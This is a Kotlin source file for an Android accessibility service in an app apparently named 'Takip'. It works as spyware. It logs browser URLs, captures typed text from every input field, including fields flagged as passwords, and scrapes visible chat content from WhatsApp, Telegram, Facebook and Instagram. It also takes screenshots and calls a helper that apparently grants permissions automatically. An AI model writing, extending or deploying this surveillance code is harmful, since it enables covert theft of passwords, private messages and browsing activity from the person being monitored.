package com.takip.app.service

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.takip.app.util.PermissionAutoGranter
import com.takip.app.util.PrefsManager

class TakipAccessibilityService : AccessibilityService() {

    private val browserPackages = setOf(
        "com.android.chrome",
        "com.google.android.googlequicksearchbox",
        "org.mozilla.firefox",
        "com.microsoft.emmx",
        "com.opera.browser",
        "com.brave.browser",
        "com.sec.android.app.sbrowser",
        "com.mi.globalbrowser",
        "com.UCMobile.intl"
    )

    private val socialPackages = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "com.facebook.katana",
        "com.facebook.orca",
        "com.instagram.android"
    )

    private val handler = Handler(Looper.getMainLooper())
    private val pendingInputs = mutableMapOf<String, Runnable>()
    private val pendingSocial = mutableMapOf<String, Runnable>()

    private var lastUrl = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!PrefsManager.isSetupComplete) return
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                captureBrowserUrl(pkg, event)
                debounceTextInput(pkg, event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                PermissionAutoGranter.tryAutoGrant(this)
                if (browserPackages.any { pkg.startsWith(it) }) {
                    captureBrowserUrl(pkg, event)
                }
                if (socialPackages.any { pkg.startsWith(it) }) {
                    debounceSocialCapture(pkg)
                }
            }
        }
    }

    private fun captureBrowserUrl(pkg: String, event: AccessibilityEvent) {
        if (!browserPackages.any { pkg.startsWith(it) }) return
        val root = rootInActiveWindow ?: return
        val url = findUrlInNode(root) ?: return
        root.recycle()
        if (url == lastUrl) return
        lastUrl = url
        val title = event.text?.firstOrNull()?.toString()
        ActivityLogQueue.addWebHistory(url, title, pkg, pkg)
    }

    private fun findUrlInNode(node: AccessibilityNodeInfo): String? {
        val text = node.text?.toString() ?: ""
        val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() else null
        val content = text.ifBlank { hint ?: "" }

        if (content.startsWith("http") || content.contains(".com") || content.contains(".tr")) {
            if (content.length in 4..500) return content
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findUrlInNode(child)
            child.recycle()
            if (found != null) return found
        }
        return null
    }

    private fun debounceTextInput(pkg: String, event: AccessibilityEvent) {
        val source = event.source
        val fieldKey = "${pkg}:${event.className}:${source?.viewIdResourceName ?: "field"}"
        val isPassword = source?.isPassword == true
        source?.recycle()

        val text = when {
            !event.text.isNullOrEmpty() -> event.text.joinToString("")
            else -> return
        }
        if (text.isBlank() || text.length > 2000) return

        pendingInputs[fieldKey]?.let { handler.removeCallbacks(it) }
        val runnable = Runnable {
            pendingInputs.remove(fieldKey)
            if (text.length < 2) return@Runnable
            val fieldName = event.className?.toString()?.substringAfterLast('.')
            ActivityLogQueue.addInputLog(pkg, pkg, fieldName, text, isPassword)
        }
        pendingInputs[fieldKey] = runnable
        handler.postDelayed(runnable, 900L)
    }

    private fun debounceSocialCapture(pkg: String) {
        pendingSocial[pkg]?.let { handler.removeCallbacks(it) }
        val runnable = Runnable {
            pendingSocial.remove(pkg)
            captureSocialScreen(pkg)
        }
        pendingSocial[pkg] = runnable
        handler.postDelayed(runnable, 1200L)
    }

    private fun captureSocialScreen(pkg: String) {
        val root = rootInActiveWindow ?: return
        val lines = mutableListOf<String>()
        collectVisibleText(root, lines)
        root.recycle()

        val content = lines
            .map { it.trim() }
            .filter { it.length >= 2 }
            .distinct()
            .joinToString("\n")

        if (content.length < 10) return

        val appLabel = when {
            pkg.contains("whatsapp") -> "WhatsApp"
            pkg.contains("telegram") -> "Telegram"
            pkg.contains("instagram") -> "Instagram"
            pkg.contains("facebook") -> "Facebook"
            else -> pkg
        }

        NotificationQueue.add(
            pkg,
            appLabel,
            "Sohbet görünümü",
            content.take(2000)
        )
    }

    private fun collectVisibleText(node: AccessibilityNodeInfo, out: MutableList<String>) {
        val text = node.text?.toString()?.trim()
        if (!text.isNullOrBlank() && node.isVisibleToUser) {
            out.add(text)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectVisibleText(child, out)
            child.recycle()
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        pendingInputs.values.forEach { handler.removeCallbacks(it) }
        pendingSocial.values.forEach { handler.removeCallbacks(it) }
        instance = null
        super.onDestroy()
    }

    fun takeScreenCapture(callback: (ByteArray?) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            callback(null)
            return
        }
        takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            mainExecutor,
            object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val buffer = result.hardwareBuffer
                        val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(buffer, result.colorSpace)
                        buffer.close()
                        if (bitmap == null) {
                            callback(null)
                            return
                        }
                        val stream = java.io.ByteArrayOutputStream()
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, stream)
                        bitmap.recycle()
                        callback(stream.toByteArray())
                    } catch (_: Exception) {
                        callback(null)
                    }
                }
                override fun onFailure(errorCode: Int) {
                    callback(null)
                }
            }
        )
    }

    companion object {
        var instance: TakipAccessibilityService? = null
    }
}
